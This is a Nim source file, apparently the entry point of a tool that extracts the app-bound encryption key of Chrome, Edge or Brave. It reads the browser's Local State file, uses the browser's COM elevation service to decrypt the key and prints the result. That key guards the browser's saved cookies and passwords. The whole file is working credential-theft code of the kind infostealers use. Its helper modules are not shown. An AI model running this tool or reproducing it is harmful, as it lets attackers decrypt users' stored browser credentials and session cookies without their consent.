import ./core/appbound, std/strformat, std/terminal, cligen, ./core/config, winim, os

proc main(browserType: string, args: seq[string]) =

    var config: BrowserConfig

    case browserType:
      of "chrome":
        config = CHROME_CONFIG
      of "edge":
        config = EDGE_CONFIG
      of "brave":
        config = BRAVE_CONFIG
      else:
        styledEcho(fgRed, "[-] " , resetStyle, "Unsupported Browser.")
        quit(-1)
    
    if not initCom():
        styledEcho(fgRed, "[-] " , resetStyle, "Failed To Initialize COM.")
        quit(-1)

    var elevator = initElevator(config.clsid, config.iid)

    if elevator == NULL:
        styledEcho(fgRed, "[-] " , resetStyle, "Failed To Create Elevator Object.")
        quit(-1)

    if not setProxyBlanket(elevator):
        styledEcho(fgRed, "[-] " , resetStyle, "Failed To Set Proxy Blanket.")
        quit(-1)

    var appdata = getAppData()
    var localStatePath = fmt"{appdata}{config.localState}"

    if not fileExists(localStatePath):
        styledEcho(fgRed, "[-] " , resetStyle, "Local State File Does Not Exist.")
        quit(-1)

    var decodedKey = getAppBoundKeyDecoded(localStatePath)

    var cipherTextData = allocCipherTextData(decodedKey)
    var key = decryptKeyData(elevator, cipherTextData)

    if key != NULL:
        styledEcho(fgGreen, "[+] ", resetStyle, "Decrypted Key: ", fgCyan, toString(key))
    else:
        styledEcho(fgRed, "[-] ", resetStyle, "Failed To Decrypt Key.")

when isMainModule:
    dispatch main